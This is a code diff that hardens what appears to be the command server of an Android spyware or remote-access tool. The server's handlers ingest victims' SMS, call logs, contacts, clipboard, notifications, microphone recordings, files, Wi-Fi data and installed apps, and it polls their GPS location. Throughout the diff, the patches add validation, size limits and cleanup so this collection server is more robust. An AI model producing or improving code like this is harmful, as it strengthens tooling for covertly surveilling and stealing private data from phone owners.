@@ -27,7 +27,10 @@ class Clients {
         let client = this.db.maindb.get('clients').find({ clientID });
         if (client.value() === undefined) {
             // Patch: Limit total unique clients to prevent disk exhaustion
-            if (this.db.maindb.get('clients').value().length > 1000) return connection.disconnect();
+            if (this.db.maindb.get('clients').value().length > 1000) {
+                delete this.clientConnections[clientID];
+                return connection.disconnect();
+            }
 
             this.db.maindb.get('clients').push({
                 clientID,
@@ -55,15 +58,16 @@ class Clients {
         console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);
 
         const shouldIgnore = this.ignoreDisconnects[clientID];
-        if (shouldIgnore) {
-            delete this.ignoreDisconnects[clientID];
-        }
+        if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];
 
         logManager.log(CONST.logTypes.info, clientID + " Disconnected")
-        this.db.maindb.get('clients').find({ clientID }).assign({
-            lastSeen: new Date(),
-            isOnline: false,
-        }).write()
+        let client = this.db.maindb.get('clients').find({ clientID });
+        if (client.value()) {
+            client.assign({
+                lastSeen: new Date(),
+                isOnline: false,
+            }).write();
+        }
         
         if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
         if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
@@ -104,7 +108,10 @@ class Clients {
                         // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                         logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed - " + error);
                     } else {
-                        client.get('CommandQue').remove({ uid: uid }).write();
+                        // Patch: Guard against missing uid
+                        if (command.uid != null) {
+                            client.get('CommandQue').remove({ uid: command.uid }).write();
+                        }
                     }
                 })
             })
@@ -149,6 +156,7 @@ class Clients {
         // });
 
         socket.on(CONST.messageKeys.files, (data) => {
+            if (!data || typeof data !== 'object') return;
             // {
             //     "type": "list"|"download"|"error",
             //     (if type = list) "list": <Array>,
@@ -169,24 +177,26 @@ class Clients {
                 // Ayy, time to recieve a file!
                 logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);
 
+                // Patch: Guard against null buffer or name
                 if (!data.buffer || !data.name || typeof data.name !== 'string') return;
-                
-                // Patch 4: Enforce size limit (100MB)
+                // Patch: Enforce size limit (100MB)
                 if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
+                // Patch: Guard against empty file uploads
+                if (data.buffer.length === 0) return logManager.log(CONST.logTypes.error, "Empty file upload from " + clientID);
                 if (data.buffer.length > 100 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "File upload too large from " + clientID);
 
                 // Patch 2 & 7: Secure random hex
                 let hash = crypto.randomBytes(16).toString('hex');
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                
+
                 // Patch 3 & 8: Sanitize name
                 let sanitizedName = path.basename(data.name);
                 let lastDot = sanitizedName.lastIndexOf(".");
-                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot) : '.bin';
-                
+                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot).toLowerCase() : '.bin';
+
                 // Patch 9: Whitelist extensions to prevent XSS
                 const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin'];
-                if (!allowedExts.includes(fileExt.toLowerCase())) fileExt = '.bin';
+                if (!allowedExts.includes(fileExt)) fileExt = '.bin';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -212,6 +222,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.call, (data) => {
+            if (!data || typeof data !== 'object') return;
             if (data.callsList && Array.isArray(data.callsList)) {
                 if (data.callsList.length !== 0) {
                     let callsList = data.callsList.slice(0, 1000); // Cap updates
@@ -235,30 +246,32 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.sms, (data) => {
-            if (typeof data === "object") {
-                let smsList = data.smslist;
-                // Patch 6: Validate smsList
-                if (smsList && Array.isArray(smsList) && smsList.length !== 0) {
-                    let dbSMS = client.get('SMSData');
-                    let newCount = 0;
-                    smsList.forEach(sms => {
-                        if (!sms.address || !sms.body) return;
-                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
-                        if (dbSMS.find({ hash }).value() === undefined) {
-                            // cool, we dont have this sms
-                            sms.hash = hash;
-                            dbSMS.push(sms).write();
-                            newCount++; // Patch 6: Increment counter
-                        }
-                    });
-                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
-                }
-            } else if (typeof data === "boolean") {
-                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
+            if (!data || typeof data !== 'object') {
+                if (typeof data === "boolean") logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
+                return;
+            }
+            let smsList = data.smslist;
+            // Patch 6: Validate smsList
+            if (smsList && Array.isArray(smsList) && smsList.length !== 0) {
+                let dbSMS = client.get('SMSData');
+                let newCount = 0;
+                smsList.forEach(sms => {
+                    // Patch: Guard against non-string address and body
+                    if (!sms.address || !sms.body || typeof sms.address !== 'string' || typeof sms.body !== 'string') return;
+                    let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
+                    if (dbSMS.find({ hash }).value() === undefined) {
+                        // cool, we dont have this sms
+                        sms.hash = hash;
+                        dbSMS.push(sms).write();
+                        newCount++; // Patch 6: Increment counter
+                    }
+                });
+                logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
             }
         });
 
         socket.on(CONST.messageKeys.mic, (data) => {
+            if (!data || typeof data !== 'object') return;
             if (data.file && data.name && typeof data.name === 'string' && data.buffer) {
                 logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
 
@@ -271,11 +284,11 @@ class Clients {
                 
                 let sanitizedName = path.basename(data.name);
                 let lastDot = sanitizedName.lastIndexOf(".");
-                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot) : '.unknown';
-                
+                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot).toLowerCase() : '.unknown';
+
                 // Absolute Final Patch: Whitelist extensions
                 const allowedExts = ['.jpg', '.png', '.mp3', '.mp4', '.txt', '.pdf', '.zip', '.apk', '.bin', '.unknown'];
-                if (!allowedExts.includes(fileExt.toLowerCase())) fileExt = '.bin';
+                if (!allowedExts.includes(fileExt)) fileExt = '.bin';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -314,6 +327,9 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.clipboard, (data) => {
+            // Patch: Guard against null/undefined clipboard content
+            if (!data || typeof data !== 'object') return;
+            if (typeof data.text !== 'string' || data.text.length > 1000000) return;
             client.get('clipboardLog').push({
                 time: new Date(),
                 content: data.text
@@ -322,8 +338,11 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.notification, (data) => {
+            if (!data || typeof data !== 'object') return;
             let dbNotificationLog = client.get('notificationLog');
-            let hash = crypto.createHash('md5').update(String(data.key) + String(data.content)).digest("hex");
+            // Patch: Guard against null/undefined key and content
+            if (typeof data.key === 'undefined' && typeof data.content === 'undefined') return;
+            let hash = crypto.createHash('md5').update(String(data.key || '') + String(data.content || '')).digest("hex");
 
             if (dbNotificationLog.find({ hash }).value() === undefined) {
                 data.hash = hash;
@@ -333,7 +352,8 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.contacts, (data) => {
-            if (data.contactsList) {
+            if (!data || typeof data !== 'object') return;
+            if (data.contactsList && Array.isArray(data.contactsList)) {
                 if (data.contactsList.length !== 0) {
                     let contactsList = data.contactsList.slice(0, 1000); // Patch: Cap updates
                     let dbContacts = client.get('contacts');
@@ -356,6 +376,7 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.wifi, (data) => {
+            if (!data || typeof data !== 'object') return;
             if (data.networks && Array.isArray(data.networks)) {
                 if (data.networks.length !== 0) {
                     let networks = data.networks.slice(0, 500); // Patch: Cap to 500 items
@@ -363,6 +384,8 @@ class Clients {
                     client.set('wifiNow', networks).write();
                     let newCount = 0;
                     networks.forEach(wifi => {
+                        // Patch: Guard against missing SSID or BSSID
+                        if (!wifi.SSID || !wifi.BSSID) return;
                         let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                         if (wifiField.value() === undefined) {
                             // cool, we dont have this call
@@ -382,12 +405,14 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.permissions, (data) => {
-            client.set('enabledPermissions', data.permissions).write();
+            if (!data || typeof data !== 'object') return;
+            client.set('enabledPermissions', data.permissions || []).write();
             logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
         });
 
         socket.on(CONST.messageKeys.installed, (data) => {
-            client.set('apps', data.apps).write();
+            if (!data || typeof data !== 'object') return;
+            client.set('apps', data.apps || []).write();
             logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
         });
     }
@@ -420,25 +445,28 @@ class Clients {
             let pageData;
             let safeFilter = (typeof filter === 'string') ? filter : undefined;
 
+            // Patch: Guard against undefined page parameter
+            if (!page || typeof page !== 'string') return false;
+
             if (page === "calls") {
                 pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                 if (safeFilter) {
-                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === safeFilter.substr(-6));
-                    if (filterData) pageData = filterData;
+                    let filterData = pageData.filter(calls => calls.phoneNo && calls.phoneNo.substr(-6) === safeFilter.substr(-6));
+                    if (filterData.length > 0) pageData = filterData;
                 }
             }
             else if (page === "sms") {
                 pageData = clientData.SMSData;
                 if (safeFilter) {
-                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === safeFilter.substr(-6));
-                    if (filterData) pageData = filterData;
+                    let filterData = pageData.filter(sms => sms.address && sms.address.substr(-6) === safeFilter.substr(-6));
+                    if (filterData.length > 0) pageData = filterData;
                 }
             }
             else if (page === "notifications") {
                 pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                 if (safeFilter) {
-                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === safeFilter);
-                    if (filterData) pageData = filterData;
+                    let filterData = pageData.filter(not => not.appName === safeFilter);
+                    if (filterData.length > 0) pageData = filterData;
                 }
             }
             else if (page === "wifi") {
@@ -464,6 +492,12 @@ class Clients {
     deleteClient(clientID) {
         this.db.maindb.get('clients').remove({ clientID }).write();
         if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
+        if (this.gpsPollers[clientID]) {
+            clearInterval(this.gpsPollers[clientID]);
+            delete this.gpsPollers[clientID];
+        }
+        if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
+        if (clientID in this.ignoreDisconnects) delete this.ignoreDisconnects[clientID];
     }
 
     // COMMAND
@@ -555,7 +589,8 @@ class Clients {
         let clientDB = this.getClientDatabase(clientID);
         let gpsSettings = clientDB.get('GPSSettings').value();
 
-        if (gpsSettings.updateFrequency >= 30) {
+        // Patch: Guard against non-numeric updateFrequency
+        if (typeof gpsSettings.updateFrequency === 'number' && gpsSettings.updateFrequency >= 30) {
             const freq = Math.min(gpsSettings.updateFrequency, 86400);
             this.gpsPollers[clientID] = setInterval(() => {
                 logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
